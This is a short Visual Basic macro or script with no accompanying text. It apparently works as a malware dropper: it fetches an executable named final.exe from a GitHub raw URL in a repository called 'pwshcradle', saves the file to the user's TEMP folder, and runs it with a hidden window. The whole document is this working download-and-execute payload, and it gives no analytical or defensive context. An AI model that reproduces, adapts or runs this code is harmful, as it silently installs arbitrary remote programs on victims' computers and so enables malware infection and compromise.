Dim http, stream, shell, exePath

exePath = Environ("TEMP") & "\final.exe"

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/final.exe", False
http.Send

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile exePath, 2
stream.Close

Set shell = CreateObject("WScript.Shell")
shell.Run """" & exePath & """", 0, False

Set http = Nothing
Set stream = Nothing
Set shell = Nothing